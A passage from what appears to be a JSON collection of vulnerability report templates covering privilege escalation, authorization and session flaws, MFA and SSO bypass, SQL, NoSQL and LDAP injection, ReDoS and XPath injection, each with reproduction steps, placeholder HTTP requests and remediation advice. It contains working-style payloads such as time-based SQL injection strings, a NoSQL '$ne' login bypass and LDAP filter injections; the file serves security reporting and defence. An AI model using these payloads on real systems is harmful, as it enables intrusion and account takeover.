      "1. Register a new account using an attacker-controlled email address or phone number, but do not complete any verification steps (if they exist).",
      "2. **[Scenario A: Access to basic features without verification]**",
      "   a. Attempt to log in or access basic non-sensitive features of the application using the unverified account.",
      "   b. **[What happened]**: The application grants access to features that should require a verified contact method (e.g., creating profiles, posting public content).",
      "   c. **[What should happen]**: The application should restrict functionality until the email/phone is verified.",
      "3. **[Scenario B: Sensitive action using unverified contact]**",
      "   a. After logging in with an unverified account, try to perform a sensitive action (e.g., add payment method, change profile information, initiate a transaction, send messages).",
      "   b. **[What happened]**: The application allows the sensitive action without requiring prior verification of the contact method associated with the account.",
      "   c. **[What should happen]**: Sensitive actions should trigger a verification step or only be allowed after the primary contact method is verified.",
      "4. **[Scenario C: Impersonation via unverified email change]**",
      "   a. Log in to an existing, verified account.",
      "   b. Change the associated email address to an attacker-controlled, *unverified* email address.",
      "   c. **[What happened]**: The application accepts the change without sending a verification link to the *new* email, or without requiring re-verification of the *old* email/password, potentially allowing the attacker to regain control if the old email is compromised.",
      "   d. **[What should happen]**: Changing primary contact methods should require verification of the new contact and/or re-authentication with the old credentials."
    ],
    "proof_of_concept": {
      "request_example": "POST /api/user/update_email HTTP/1.1\nHost: app.example.com\nCookie: sessionid=[victim_session]\nContent-Type: application/json\n\n{\"new_email\": \"attacker@example.com\"}",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"success\", \"message\": \"Email updated successfully.\"}",
      "notes": "Provide screenshots or a video demonstrating an action performed or access granted without proper email/phone verification."
    },
    "impact": "Allows attackers to create and use accounts for malicious purposes (spam, fraud) without proper attribution. Can lead to account hijacking if an attacker can change a victim's primary contact to an unverified one. Impairs the ability to recover accounts or send critical notifications to legitimate users.",
    "remediation_suggestion": "Strictly enforce email/phone verification for all new accounts before granting full access to the application's features. For sensitive actions or changes to primary contact information, require re-verification or a confirmation step to the *new* contact method, and potentially to the *old* contact method or via re-authentication."
  },
  {
    "vulnerability_name": "Vertical Privilege Escalation",
    "summary": "A low-privileged user (e.g., a regular user) can gain access to functionalities or data reserved for a higher-privileged user (e.g., administrator, moderator) without proper authorization.",
    "severity": "High",
    "target": "[Specify affected application/service, e.g., app.example.com]",
    "url_location": "[Full URL of the restricted endpoint, e.g., https://app.example.com/admin/users or https://app.example.com/api/delete_user]",
    "steps_to_reproduce": [
      "1. Log in as a low-privileged user (e.g., `userA`).",
      "2. Identify a functionality or page that is typically reserved for higher-privileged users (e.g., 'Admin Dashboard', 'User Management', 'Settings for all users').",
      "3. **[Scenario A: Direct URL Access]**",
      "   a. Attempt to directly access the URL of the restricted page (e.g., `https://app.example.com/admin/dashboard`).",
      "   b. **[What happened]**: The low-privileged user can access the page, view administrative content, or perform administrative actions.",
      "   c. **[What should happen]**: The application should return an 'Access Denied' or 'Unauthorized' error.",
      "4. **[Scenario B: Parameter Tampering in API Request]**",
      "   a. Intercept an API request made by a low-privileged user (e.g., updating a user's own profile `POST /api/user/update`).",
      "   b. Modify a parameter in the request to attempt to change another user's attributes (e.g., change `user_id=self` to `user_id=admin_id`) or modify a privilege-related parameter (e.g., change `role=user` to `role=admin`).",
      "   c. **[What happened]**: The API successfully processes the request for the administrative user or changes their role, indicating a bypass of authorization.",
      "   d. **[What should happen]**: The server should validate that the authenticated user has the necessary privileges to perform the requested action on the target object/user.",
      "5. **[Scenario C: Changing HTTP Method/JSON Payload]**",
      "   a. Observe an endpoint that typically uses GET requests (e.g., `/user/123`).",
      "   b. Change the HTTP method to POST or PUT, and try to send a JSON payload to modify the user's data or role.",
      "   c. **[What happened]**: The server accepts the modification, allowing privilege escalation. (This is more of a generic improper authorization, but often leads to Vertical PE)."
    ],
    "proof_of_concept": {
      "request_example": "GET /admin/dashboard HTTP/1.1\nHost: app.example.com\nCookie: sessionid=[low_privilege_user_session_id]\n\n---\n\nPOST /api/user/update HTTP/1.1\nHost: app.example.com\nCookie: sessionid=[low_privilege_user_session_id]\nContent-Type: application/json\n\n{\"user_id\": \"[admin_user_id]\", \"role\": \"admin\"}",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
      "notes": "Provide screenshots or a video clearly showing the low-privileged user accessing or modifying restricted resources/functionalities."
    },
    "impact": "Complete compromise of administrative or highly privileged accounts, leading to full control over the application, sensitive data access/manipulation, system configuration changes, and potential for further exploitation (e.g., RCE through admin panel).",
    "remediation_suggestion": "Implement strict server-side access control checks for all functionalities and resources based on the authenticated user's role and permissions. Never rely solely on client-side controls (e.g., hidden links, disabled buttons). Use a robust authorization framework. Map user roles to specific permissions and enforce these permissions at every sensitive endpoint."
  },
  {
    "vulnerability_name": "Horizontal Privilege Escalation",
    "summary": "An authenticated user can access or manipulate data or functionality belonging to another user of the *same* privilege level.",
    "severity": "High",
    "target": "[Specify affected application/service, e.g., app.example.com]",
    "url_location": "[Full URL of the vulnerable endpoint, e.g., https://app.example.com/order?id=123]",
    "steps_to_reproduce": [
      "1. Register or log in as `User A`.",
      "2. Create some data or access a resource specific to `User A` (e.g., `Order ID 123`, `Profile ID 456`).",
      "3. Identify the parameter in the URL or request body that references `User A`'s data (e.g., `id=123`, `profile_id=456`).",
      "4. Log in or register as `User B` (another user of the same privilege level).",
      "5. **[Scenario A: IDOR (already covered, but primary horizontal PE)]**",
      "   a. While authenticated as `User B`, attempt to access or modify `User A`'s data by changing the identified parameter to `User A`'s ID (e.g., navigate to `https://app.example.com/order?id=123`).",
      "   b. **[What happened]**: `User B` can view/modify `User A`'s data.",
      "   c. **[What should happen]**: The application should return an 'Access Denied' or 'Unauthorized' error.",
      "6. **[Scenario B: Cookie/Session Manipulation]**",
      "   a. As `User B`, capture a request to a resource specific to `User B`.",
      "   b. Observe if user-specific IDs are stored in cookies or other client-side storage.",
      "   c. Try to manipulate these client-side identifiers to `User A`'s identifiers.",
      "   d. **[What happened]**: `User B` gains access to `User A`'s data or functionality.",
      "   e. **[What should happen]**: All authorization decisions should be made server-side, not relying on client-side data.",
      "7. **[Scenario C: API Endpoint Abuse]**",
      "   a. Identify an API endpoint that allows users to query or update their own data (e.g., `GET /api/me/profile`).",
      "   b. Try to modify the request to query/update another user's profile (e.g., `GET /api/users/[User_A_ID]/profile`).",
      "   c. **[What happened]**: The API returns or modifies `User A`'s data.",
      "   d. **[What should happen]**: The API should enforce that only the authenticated user's data can be accessed/modified, or that the request is made to the correct user-specific endpoint (`/api/me/profile`)."
    ],
    "proof_of_concept": {
      "request_example": "GET /order?id=[User_A_OrderID] HTTP/1.1\nHost: app.example.com\nCookie: sessionid=[User_B_session_id]",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
      "notes": "Provide screenshots or a video clearly showing `User B` accessing or modifying `User A`'s data."
    },
    "impact": "Violation of user privacy, unauthorized access to other users' sensitive information, data manipulation, and potential for financial fraud or reputation damage. This undermines the trust and security of the application.",
    "remediation_suggestion": "Implement strict server-side authorization checks for every request that involves accessing or modifying user-specific data. Ensure that the authenticated user is the legitimate owner or is explicitly authorized to interact with the requested resource. Use session-based authorization and avoid relying on IDs passed directly in URL parameters if possible."
  },
  {
    "vulnerability_name": "Privilege Escalation (General)",
    "summary": "A generic term for any flaw that allows a user to gain higher privileges or access resources/data they are not authorized to access, covering both vertical and horizontal scenarios that may not fit neatly into specific sub-categories.",
    "severity": "High",
    "target": "[Specify affected application/service]",
    "url_location": "[Relevant URL or API endpoint]",
    "steps_to_reproduce": [
      "1. Identify a user account with limited privileges (e.g., standard user, guest).",
      "2. Look for any unusual behavior, hidden parameters, or undocumented API endpoints.",
      "3. Try to access or modify resources/functionalities that appear to be beyond the current user's intended scope.",
      "4. **[Scenario A: Unchecked API Endpoint]**",
      "   a. Discover an API endpoint (e.g., `/api/v1/admin/settings`) that is not linked from the UI for your user.",
      "   b. Attempt to send requests to this endpoint.",
      "   c. **[What happened]**: The API responds with sensitive data or allows an action (e.g., changing global settings) without sufficient authorization checks.",
      "   d. **[What should happen]**: The API should enforce authorization checks based on the authenticated user's role.",
      "5. **[Scenario B: Cookie/Session Flag Manipulation]**",
      "   a. Observe the session cookies or tokens after login.",
      "   b. If any flags (e.g., `is_admin=false`, `role=user`) are present and appear to be client-controlled, try changing them to `is_admin=true` or `role=admin`.",
      "   c. **[What happened]**: The application recognizes the manipulated flag and grants elevated privileges.",
      "   d. **[What should happen]**: Session integrity and authorization logic should be entirely server-side, not relying on client-side attributes.",
      "6. **[Scenario C: Business Logic Flaw leading to PE]**",
      "   a. Identify a multi-step process (e.g., creating a project, adding collaborators).",
      "   b. In one step, specify a resource ID that you don't own, or a user ID that you're not allowed to manage.",
      "   c. **[What happened]**: The application proceeds, unexpectedly linking you to the unauthorized resource or allowing you to control another user's action.",
      "   d. **[What should happen]**: Each step of the business logic should re-validate the user's authorization against the specified resources/users."
    ],
    "proof_of_concept": {
      "request_example": "POST /api/v1/admin/settings HTTP/1.1\nHost: example.com\nCookie: sessionid=[low_privilege_session]\nContent-Type: application/json\n\n{\"allow_new_registrations\": false}",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"success\", \"message\": \"Settings updated.\"}",
      "notes": "Provide clear screenshots or a video demonstrating the unauthorized access or action."
    },
    "impact": "Unauthorized access to sensitive data, functionalities, or administrative controls. Can lead to complete system compromise, data theft, or disruption of services. The specific impact depends on the level of privileges gained.",
    "remediation_suggestion": "Implement comprehensive and layered authorization checks on the server-side for every resource and action. Adopt the principle of least privilege. Perform regular authorization reviews and ensure that direct object references are properly validated. Avoid relying on client-side data for authorization decisions. Apply rate limiting to prevent brute-force attempts on permission-related endpoints."
  },
  {
    "vulnerability_name": "Improper Authorization",
    "summary": "The application fails to correctly enforce access restrictions, allowing users to perform actions or access resources for which they lack the necessary permissions. This is a broad category encompassing various specific authorization flaws.",
    "severity": "Medium",
    "target": "[Specify affected application/service, e.g., app.example.com]",
    "url_location": "[Any sensitive endpoint or functionality, e.g., https://app.example.com/user/edit_profile or https://app.example.com/documents/private_doc.pdf]",
    "steps_to_reproduce": [
      "1. Log in as `User A` (e.g., a regular user).",
      "2. Identify a resource or functionality that should be restricted to other users or higher roles.",
      "3. **[Scenario A: Accessing another user's data]**",
      "   a. Find a resource ID associated with `User B` (e.g., `user_id=123`, `document_id=abc`).",
      "   b. Attempt to access `User B`'s resource using `User A`'s session (e.g., `https://app.example.com/profile?user_id=123`).",
      "   c. **[What happened]**: `User A` can view or manipulate `User B`'s data.",
      "   d. **[What should happen]**: The application should verify that `User A` is authorized to access `User B`'s data.",
      "4. **[Scenario B: Accessing admin/privileged functionality]**",
      "   a. As `User A`, try to access a URL or send an API request that appears to be for an administrator (e.g., `https://app.example.com/admin/logs`, `POST /api/settings/global_config`).",
      "   b. **[What happened]**: The application allows `User A` to access the functionality or modify settings.",
      "   c. **[What should happen]**: The application should verify `User A`'s role and permissions before granting access.",
      "5. **[Scenario C: Bypassing workflow/state restrictions]**",
      "   a. Consider a workflow where an item can only be 'approved' after being 'submitted'.",
      "   b. As `User A` (who can 'submit' but not 'approve'), intercept the request to 'approve' an item.",
      "   c. Bypass previous steps (e.g., go directly to the 'approve' step, or modify a parameter).",
      "   d. **[What happened]**: `User A` can 'approve' the item without following the workflow.",
      "   e. **[What should happen]**: The application should validate the state transitions and the user's permissions at each step."
    ],
    "proof_of_concept": {
      "request_example": "GET /documents/private_doc.pdf HTTP/1.1\nHost: app.example.com\nCookie: sessionid=[user_A_session_id]",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: application/pdf\n\n",
      "notes": "Provide clear screenshots or a video demonstrating the unauthorized access or action performed by a user lacking proper authorization."
    },
    "impact": "Unauthorized access to sensitive data, functionalities, or administrative controls. This can lead to privacy breaches, data manipulation, financial loss, or overall compromise of the system's integrity. It undermines the security model by allowing users to bypass intended restrictions.",
    "remediation_suggestion": "Implement robust, server-side authorization checks for *every* request to ensure that the authenticated user has the necessary permissions to access the requested resource or perform the requested action. Adopt the principle of least privilege. Avoid relying on client-side controls for authorization. Conduct thorough testing of all access control logic across different user roles and scenarios."
  },
      {
        "vulnerability_name": "Broken Authentication/Session Management (General)",
        "summary": "This is a broad category encompassing various flaws related to how user identities are verified, authenticated, and how sessions are managed. It includes issues like weak session IDs, insecure cookie handling, or insufficient credential management, leading to unauthorized access.",
        "severity": "High",
        "target": "[Specify affected application/service, e.g., auth.example.com]",
        "url_location": "[Relevant login endpoint, any authenticated page, or cookie-setting endpoint, e.g., https://auth.example.com/login, https://app.example.com/dashboard]",
        "steps_to_reproduce": [
          "1. **[Scenario A: Predictable Session IDs]**",
          "   a. Log in multiple times as a regular user.",
          "   b. Observe the session IDs generated by the application (e.g., in cookies).",
          "   c. **[What happened]**: The session IDs show a predictable pattern (e.g., sequential numbers, timestamp-based without sufficient entropy, simple encoding).",
          "   d. **[What should happen]**: Session IDs should be cryptographically random and unpredictable.",
          "   e. Use the observed pattern to predict another user's session ID and attempt to hijack their session.",
          "2. **[Scenario B: Insecure Cookie Attributes]**",
          "   a. Log in to the application and inspect the session cookie in your browser's developer tools.",
          "   b. **[What happened]**: The session cookie is missing important security attributes like `HttpOnly`, `Secure`, `SameSite=Lax` or `Strict`.",
          "   c. **[What should happen]**: Session cookies should be protected with `HttpOnly` (preventing JS access), `Secure` (forcing HTTPS), and `SameSite` (mitigating CSRF).",
          "3. **[Scenario C: Credential Management Flaws]**",
          "   a. Attempt to register/login with common usernames/passwords (e.g., 'test/test', 'admin/admin').",
          "   b. Observe if the application reveals too much information in error messages (e.g., 'Invalid password for user X' vs. 'Invalid credentials').",
          "   c. **[What happened]**: Weak default credentials are accepted or error messages aid in enumeration.",
          "   d. **[What should happen]**: Strong credential management policies should be enforced, and generic error messages should be used."
        ],
        "proof_of_concept": {
          "request_example": "GET /dashboard HTTP/1.1\nHost: app.example.com\nCookie: sessionid=PREDICTED_SESSION_ID_FOR_ANOTHER_USER",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
          "notes": "Provide screenshots demonstrating predictable session IDs, missing cookie flags, or verbose error messages. A video showing session hijacking due to predictability would be ideal."
        },
        "impact": "Unauthorized access to user accounts, session hijacking, identity theft, and potential for further exploitation. This undermines the fundamental security of the application by allowing attackers to bypass authentication.",
        "remediation_suggestion": "Ensure session IDs are generated with sufficient randomness and entropy. Implement strict session management policies, including strong inactivity and absolute timeouts. Always regenerate session IDs after successful authentication. Protect session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes. Enforce robust password policies and provide generic error messages to prevent enumeration."
      },
      {
        "vulnerability_name": "MFA Bypass (Beyond OTP, e.g., Biometric, Push)",
        "summary": "The multi-factor authentication (MFA) mechanism, beyond traditional OTPs, can be bypassed due to implementation flaws, allowing an attacker to gain unauthorized access to an account with only the primary credentials.",
        "severity": "High",
        "target": "[Specify affected application/service, e.g., mobile.example.com]",
        "url_location": "[Full URL of the MFA verification page or API endpoint, e.g., https://mobile.example.com/mfa/confirm]",
        "steps_to_reproduce": [
          "1. **[Scenario A: Push Notification Bypass via API]**",
          "   a. Log in with a valid username and password for an account with Push MFA enabled.",
          "   b. Observe the pending push notification.",
          "   c. Intercept the API call that the application makes to check the MFA status (e.g., polling endpoint).",
          "   d. **[What happened]**: Manipulate the response of this API call to simulate a successful MFA (e.g., change `status: pending` to `status: approved`) without actually approving the push.",
          "   e. **[What should happen]**: The API should only confirm MFA completion after a legitimate approval by the user.",
          "2. **[Scenario B: Out-of-band Fallback Weakness]**",
          "   a. Initiate a login with valid username/password for an MFA-protected account.",
          "   b. If there's a 'fallback' option (e.g., 'Lost your device?', 'Use a recovery code'), try exploiting it.",
          "   c. **[What happened]**: The fallback mechanism (e.g., recovery codes are sequential, or email verification for recovery is weak/susceptible to enumeration) allows bypass.",
          "   d. **[What should happen]**: Fallback mechanisms should be as secure as the primary MFA, or require additional stringent verification.",
          "3. **[Scenario C: Insecure Session State After MFA]**",
          "   a. Log in with valid username/password and complete MFA.",
          "   b. Copy the authenticated session cookie/token.",
          "   c. Log out and immediately attempt to log in with the same username/password (without MFA).",
          "   d. While at the MFA prompt, use the previously copied authenticated session cookie/token in a new request to a sensitive endpoint.",
          "   e. **[What happened]**: The old authenticated session token is still valid and grants access, bypassing the MFA prompt.",
          "   f. **[What should happen]**: MFA state should be tightly integrated with session validity, and any pre-MFA authenticated state should be immediately invalidated upon MFA failure or prompt for re-authentication."
        ],
        "proof_of_concept": {
          "request_example": "GET /api/mfa_status?user_id=123 HTTP/1.1\nHost: mobile.example.com\n\n---\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"approved\", \"token\": \"session_token\"}",
          "notes": "Provide a video demonstrating the successful bypass of the specific MFA method and gaining access to the account."
        },
        "impact": "Complete account takeover for users with MFA enabled, eliminating the security benefits of MFA. This can lead to unauthorized access to sensitive information, financial fraud, and compromise of user trust.",
        "remediation_suggestion": "Ensure server-side validation of all MFA steps and responses. Implement strong rate limiting on all MFA verification attempts, including recovery options. Tightly integrate MFA status with session management, ensuring that session tokens are only valid after successful MFA. Thoroughly review the security of all fallback and recovery mechanisms for MFA."
      },
      {
        "vulnerability_name": "SSO Misconfigurations (General)",
        "summary": "Flaws in the implementation or configuration of Single Sign-On (SSO) systems (beyond specific OAuth/SAML issues) that can lead to authentication bypass, account takeover, or unauthorized access.",
        "severity": "High",
        "target": "[Specify affected application/service and/or IdP, e.g., app.example.com, sso.example.com]",
        "url_location": "[Relevant SSO endpoints, e.g., https://app.example.com/sso/login, https://app.example.com/sso/callback]",
        "steps_to_reproduce": [
          "1. **[Scenario A: Insecure User Provisioning/JIT Provisioning]**",
          "   a. Register a new account on the IdP with a username or email that conflicts with an existing user on the Service Provider (SP), but with different capitalization or special characters.",
          "   b. Initiate SSO login from the SP, which redirects to the IdP.",
          "   c. Log in to the IdP with the attacker's account.",
          "   d. **[What happened]**: The SP creates a *new* account for the attacker (or links to an existing one) due to loose matching (e.g., case-insensitive email matching when it should be strict), allowing account spoofing or duplicate account creation.",
          "   e. **[What should happen]**: User provisioning should use strict matching logic, and if an account already exists, proper linking or error handling should occur.",
          "2. **[Scenario B: Weak Signature/Encryption Requirements]**",
          "   a. Intercept the SSO assertion/token exchanged between the IdP and SP.",
          "   b. **[What happened]**: The assertion/token is not signed or encrypted, or uses weak algorithms, allowing for tampering (e.g., changing user ID, roles) before it reaches the SP.",
          "   c. **[What should happen]**: All SSO assertions/tokens should be digitally signed and, for sensitive data, encrypted to ensure integrity and confidentiality.",
          "3. **[Scenario C: Missing Audience Restriction]**",
          "   a. Obtain a valid SSO assertion/token for one Service Provider (SP1).",
          "   b. Attempt to replay this assertion/token to a *different* Service Provider (SP2) that uses the same IdP.",
          "   c. **[What happened]**: SP2 accepts the assertion/token even though it was not intended for it, granting access.",
          "   d. **[What should happen]**: Service Providers should strictly validate the 'Audience Restriction' in the SSO assertion to ensure it's intended for them."
        ],
        "proof_of_concept": {
          "request_example": "POST /sso/callback HTTP/1.1\nHost: app.example.com\nContent-Type: application/x-www-form-urlencoded\n\nsso_assertion=[Tampered_or_Replayed_SSO_Assertion]",
          "notes": "Provide a video demonstrating the account takeover or unauthorized access through SSO misconfiguration, showing the before and after state."
        },
        "impact": "Authentication bypass, account takeover, identity spoofing, and unauthorized access to resources across multiple applications integrated via SSO. This compromises the central authentication system and can lead to widespread compromise.",
        "remediation_suggestion": "Implement strict validation for all incoming SSO assertions, including signature validity, expiration, and audience restriction. Ensure Just-In-Time (JIT) provisioning uses strict matching logic for existing accounts. Use secure algorithms for signing and encrypting SSO assertions. Regularly audit SSO configurations with both IdP and SP."
      },
      {
        "vulnerability_name": "SQL Injection",
        "summary": "SQL Injection (SQLi) allows an attacker to interfere with the queries that an application makes to its database. This can enable them to view data that they are not normally able to retrieve, alter data, execute administration operations on the database, or even issue commands to the operating system.",
        "severity": "Critical",
        "target": "[Specify affected asset, e.g., web.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://web.example.com/products?category=gifts]",
        "steps_to_reproduce": [
          "1. Identify an input field or URL parameter that interacts with a database (e.g., search box, login form, product category ID).",
          "2. **[Scenario A: Error-Based SQLi]**",
          "   a. In the vulnerable parameter, append a SQLi payload that is designed to cause a database error and reveal information (e.g., `category=gifts'` or `id=1 OR 1=1`).",
          "   b. **[What happened]**: The application returns a detailed database error message containing SQL syntax, table names, or other sensitive information.",
          "   c. **[What should happen]**: The application should handle errors gracefully without exposing database details.",
          "3. **[Scenario B: Boolean-Based Blind SQLi]**",
          "   a. In the vulnerable parameter, inject payloads that cause the application to return different responses based on a boolean condition (e.g., `id=1 AND 1=1` vs. `id=1 AND 1=2`).",
          "   b. **[What happened]**: The application's response (e.g., page content, HTTP status code) differs, allowing an attacker to infer information character by character.",
          "   c. **[What should happen]**: The application's response should be consistent regardless of the injected SQL condition.",
          "4. **[Scenario C: Time-Based Blind SQLi]**",
          "   a. In the vulnerable parameter, inject payloads that cause a time delay if a condition is true (e.g., `id=1 AND SLEEP(5)` or `id=1 UNION SELECT SLEEP(5)`).",
          "   b. **[What happened]**: The application's response is delayed, confirming the SQLi vulnerability and allowing data exfiltration through timing.",
          "   c. **[What should happen]**: Response times should not be influenced by arbitrary SQL queries."
        ],
        "proof_of_concept": {
          "request_example": "GET /products?category=gifts' AND (SELECT 1 FROM (SELECT SLEEP(5))A)-- HTTP/1.1\nHost: web.example.com",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
          "notes": "Provide HTTP request/response pairs demonstrating the SQLi. Include screenshots of error messages, differing page content, or network tab showing response delays."
        },
        "impact": "Complete compromise of the database, including unauthorized access to sensitive data (user credentials, financial data, personal information), data modification, or deletion. Can lead to remote code execution (RCE) on the database server or even the web server in some configurations (e.g., via `xp_cmdshell` or `LOAD_FILE`).",
        "remediation_suggestion": "Use parameterized queries (prepared statements) for all database interactions. Implement strict input validation and whitelist acceptable input where possible. Avoid dynamically constructing SQL queries using user-supplied input. Limit database user permissions to the absolute minimum required. Avoid displaying verbose database error messages to users."
      },
      {
        "vulnerability_name": "NoSQL Injection",
        "summary": "NoSQL Injection allows an attacker to interfere with the queries that an application makes to its NoSQL database (e.g., MongoDB, CouchDB, Cassandra), similar to SQL Injection, but leveraging NoSQL query syntaxes.",
        "severity": "High",
        "target": "[Specify affected asset, e.g., api.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://api.example.com/users/search?username=]",
        "steps_to_reproduce": [
          "1. Identify an input field or URL parameter that interacts with a NoSQL database (e.g., login form, search query).",
          "2. **[Scenario A: Authentication Bypass (MongoDB)]**",
          "   a. In a login form, for the username, enter `username=admin`.",
          "   b. For the password, enter a NoSQL injection payload like `password[$ne]=null` or `password[$gt]=''`. (This will match any password that is not null/empty).",
          "   c. **[What happened]**: The application logs you in as the 'admin' user (or the first user matched).",
          "   d. **[What should happen]**: Authentication should fail for invalid credentials.",
          "3. **[Scenario B: Data Enumeration/Exfiltration]**",
          "   a. In a search parameter (e.g., `search=`), try injecting NoSQL operators to bypass filters or extract data (e.g., `search={'price': {'$gt': 0}}` or `search={'username': 'admin', 'password': {'$regex': '^a'}}`).",
          "   b. **[What happened]**: The application returns results it should not, or behaves differently, allowing inference of data character by character.",
          "   c. **[What should happen]**: Input should be sanitized and validated before being used in NoSQL queries.",
          "4. **[Scenario C: Operator Injection]**",
          "   a. Identify an endpoint where a parameter is directly concatenated into a NoSQL query.",
          "   b. Inject a NoSQL operator to change the query's logic (e.g., `filter={'id': 'user_id', '$where': 'this.password.length > 5'}`).",
          "   c. **[What happened]**: The application executes the injected operator, revealing information or performing unauthorized actions.",
          "   d. **[What should happen]**: User input should be treated as literal values, not executable code/operators."
        ],
        "proof_of_concept": {
          "request_example": "POST /login HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\n  \"username\": \"admin\",\n  \"password\": {\"$ne\": null}\n}",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"success\",\n  \"message\": \"Login successful\",\n  \"user\": {\"username\": \"admin\", \"role\": \"administrator\"}\n}",
          "notes": "Provide HTTP request/response pairs demonstrating the successful bypass or data enumeration. Include screenshots of the login success or unexpected data returned."
        },
        "impact": "Authentication bypass leading to account takeover. Unauthorized access to sensitive data, data modification, or deletion within the NoSQL database. Can potentially lead to denial of service or remote code execution depending on the database and application configuration.",
        "remediation_suggestion": "Avoid dynamically constructing NoSQL queries using unsanitized user input. Use safe API methods provided by the NoSQL database drivers that treat input as literal values. Implement strict input validation, including type checking and whitelisting. For authentication, use a strong password hashing algorithm and proper credential verification logic."
      },
      {
        "vulnerability_name": "LDAP Injection",
        "summary": "LDAP Injection allows an attacker to interfere with the queries that an application makes to its LDAP (Lightweight Directory Access Protocol) directory. This can enable them to bypass authentication, retrieve unauthorized information from the directory, or manipulate entries.",
        "severity": "High",
        "target": "[Specify affected asset, e.g., auth.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://auth.example.com/login]",
        "steps_to_reproduce": [
          "1. Identify an input field that is used to query an LDAP directory (e.g., username in a login form, user search field).",
          "2. **[Scenario A: Authentication Bypass]**",
          "   a. In a login form, for the username, enter an LDAP injection payload like `*)(cn=*` (if using a common filtering pattern) or `admin)(password=*` or `*)(objectClass=*`.",
          "   b. For the password, enter any value.",
          "   c. **[What happened]**: The application logs you in as an arbitrary user, often the first user in the directory (e.g., 'admin').",
          "   d. **[What should happen]**: Authentication should fail for invalid credentials.",
          "3. **[Scenario B: Information Disclosure]**",
          "   a. In a user search or profile lookup field, enter a payload like `*) (objectClass=*)` or `*` to broaden the search.",
          "   b. **[What happened]**: The application returns more information than intended, potentially listing other users, groups, or sensitive attributes from the LDAP directory.",
          "   c. **[What should happen]**: The application should only return information related to the current authenticated user or based on strict search criteria.",
          "4. **[Scenario C: Filter Modification]**",
          "   a. If the application uses a fixed filter for a search, try to inject parameters to modify it (e.g., `user_id=attacker_id)(mail=*`).",
          "   b. **[What happened]**: The LDAP query is altered to return results for the attacker's criteria or to bypass a filter.",
          "   c. **[What should happen]**: Input should be escaped and validated before being used in LDAP filters."
        ],
        "proof_of_concept": {
          "request_example": "POST /login HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=*)(cn=*&password=anypassword",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
          "notes": "Provide HTTP request/response pairs demonstrating the successful bypass or information disclosure. Include screenshots of successful login or unexpected data returned from LDAP."
        },
        "impact": "Authentication bypass leading to account takeover. Unauthorized access to sensitive information stored in the LDAP directory (e.g., user details, group memberships, phone numbers). Can lead to internal network reconnaissance or further attacks by mapping user roles and structures.",
        "remediation_suggestion": "Use parameterized LDAP queries or safely escape all user-supplied input before incorporating it into LDAP queries. Implement strict input validation for all fields that interact with LDAP. Use an allowlist for acceptable characters and patterns. Configure the LDAP binding user with the least privileges necessary."
      },
      {
        "vulnerability_name": "ReDoS (Regular Expression Denial of Service)",
        "summary": "ReDoS occurs when an application uses a vulnerable regular expression that, when confronted with specific malicious input, causes the regex engine to fall into a state of extremely slow processing, leading to a denial of service (DoS) for the application.",
        "severity": "Medium",
        "target": "[Specify affected asset, e.g., api.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint where regex is used, e.g., https://api.example.com/validate_email]",
        "steps_to_reproduce": [
          "1. Identify an input field where regular expressions are likely used for validation (e.g., email validation, username validation, search functionality, parsing user-supplied patterns).",
          "2. Understand or guess the likely regex pattern (e.g., `^(a+)+$`, `(ab|a)*c`).",
          "3. Construct a malicious input string that exploits the regex's catastrophic backtracking (e.g., for `^(a+)+$`, use `aaaaaaaaaaaaaaaaaaaaaaaa!`). The key is usually repeating characters that match the beginning of a repeating group, followed by a non-matching character.",
          "4. Send a request with this malicious input to the vulnerable endpoint.",
          "5. **[What happened]**: Observe a significant delay in the server's response time (e.g., 5-10 seconds or more, instead of milliseconds). Repeat with increasing input length to confirm exponential time complexity.",
          "6. **[What should happen]**: The application should process the input quickly or reject it efficiently without causing a DoS."
        ],
        "proof_of_concept": {
          "request_example": "POST /validate_email HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"email\": \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!example.com\"}",
          "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"error\",\n  \"message\": \"Invalid email format.\"\n} (Response time: > 5 seconds)",
          "notes": "Provide network tab screenshots showing the prolonged response times, or a video demonstrating the delay. Include details on the vulnerable regex pattern if known or inferred."
        },
        "impact": "Denial of Service (DoS) for the application or specific functionality, making it unresponsive or very slow for legitimate users. This can lead to reputational damage, financial losses due to service disruption, and potential security concerns if critical features become unavailable.",
        "remediation_suggestion": "Audit all regular expressions used in the application for catastrophic backtracking vulnerabilities. Use 'safe' regex patterns that avoid problematic constructs (e.g., nested quantifiers like `(a+)+`, `(a|b)*`, `(a|a)*`). Implement strict input limits and timeouts for regex processing. Consider using a regex engine or library that provides built-in protections against ReDoS."
      },
      {
        "vulnerability_name": "XPATH Injection",
        "summary": "XPATH Injection allows an attacker to interfere with the queries that an application makes to its XML data using XPath (XML Path Language). This can enable them to bypass authentication, retrieve unauthorized information from XML documents, or manipulate XPath queries.",
        "severity": "High",
        "target": "[Specify affected asset, e.g., data.example.com]",
        "url_location": "[Full URL of the vulnerable endpoint, e.g., https://data.example.com/search?product=]",
        "steps_to_reproduce": [
          "1. Identify an input field or URL parameter that is likely used to query an XML document via XPath (e.g., product search, user lookup in XML-based configuration).",
          "2. **[Scenario A: Authentication Bypass]**",
